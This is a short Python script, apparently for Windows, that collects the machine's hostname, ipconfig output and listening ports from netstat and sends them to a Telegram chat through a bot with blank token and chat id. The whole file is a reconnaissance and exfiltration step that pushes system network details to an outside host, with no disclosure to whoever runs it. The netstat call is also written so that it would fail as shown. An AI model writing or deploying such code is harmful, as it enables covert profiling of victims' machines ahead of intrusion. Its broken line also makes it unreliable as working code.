#import libraries
import telebot
import subprocess
import socket
name = socket.gethostname()

token = '' #BotFather's token
bot = telebot.TeleBot(token) #creating bot

output = subprocess.check_output(['ipconfig']) #console text with command ipconfig
netstat = subprocess.check_output(['netstat -a | find "LISTENING"'])


try:
    output = output.decode('utf-8') #uncoding utf-8
    netstat = netstat.decode('utf-8')
except UnicodeDecodeError:
    try:
        output = output.decode('ascii') #uncoding ascii
        netstat = netstat.decode('ascii')
    except UnicodeDecodeError:
        try:
            output = output.decode('cp866') #uncoding cp866
            netstat = netstat.decode('cp866')

        except UnicodeDecodeError:
            pass
file = 'Name: ' + name + '\n' + output + '\n' + netstat
#send ip
bot.send_message(chat_id='', text=file)

bot.infinity_polling()